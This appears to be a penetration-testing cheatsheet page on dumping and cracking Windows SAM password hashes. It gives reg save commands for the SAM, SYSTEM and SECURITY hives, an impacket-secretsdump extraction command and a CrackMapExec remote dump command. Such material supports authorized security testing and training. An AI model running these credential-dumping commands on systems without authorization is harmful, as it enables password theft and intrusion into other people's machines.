# Windows SAM

You need to have administrator privileges to access the SAM Registry hive.

## Registry Hives

| Registry Hive | Description |
|-|-|
| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

## Dumping the SAM Registry Hive

Dump the SAM Registry hive using the `reg` command and transfer the files to your attacker machine.:

```batch
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

Use `impacket-secretsdump` to extract the hashes from the SAM Registry hive:

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

## Dumping SAM Remotely

Dump it using `CrackMapExec`:

```bash title="Dump SAM with CrackMapExec"
cme smb <ip> -u <username> -p <password> --sam
```

:::tip

The output format is `username:RID:LMHASH:NTHASH`.

:::

## Cracking the Hashes

Navigate to the [SMB Commands Cheatsheet](/commands-cheatsheet/smb#brute-forcing-credentials).
